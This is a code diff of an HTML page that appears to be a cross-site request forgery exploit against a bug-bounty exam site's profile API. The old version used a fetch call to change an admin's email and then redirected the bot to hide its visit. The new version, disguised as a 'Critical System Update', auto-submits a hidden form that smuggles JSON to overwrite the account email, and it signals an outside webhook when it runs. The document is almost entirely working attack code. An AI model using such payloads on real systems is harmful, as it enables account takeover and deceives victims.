@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Critical System Update</title>
+</head>
 <body>
+    <h1>Processing Log ID: 69e16464...</h1>
+    
+    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"fullName":"Admin_Pwned","email":"rundlady@gongjua.com","ignore":"' value='"}'>
+    </form>
+
     <script>
-        const msgId = "69e16464bee6d6b7c6627539";
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        
-        // 1. Perform the Attack (Change Email)
-        fetch(target, {
-            method: "PATCH",
-            mode: "no-cors",
-            headers: { "Content-Type": "text/plain" },
-            body: JSON.stringify({
-                "fullName": "Admin Pwned",
-                "email": "rundlady@gongjua.com"
-            })
-        }).then(() => {
-            // 2. IMMEDIATELY send the bot back to the message page
-            // This makes it look like the bot never left!
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
-        });
+        // 1. Log to your webhook so you know the bot is running the form
+        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?status=form_submitting");
+
+        // 2. Submit the form automatically
+        // This will redirect the bot's browser to the API, carrying the cookies
+        setTimeout(() => {
+            document.getElementById('exploitForm').submit();
+        }, 500);
     </script>
 </body>
 </html>
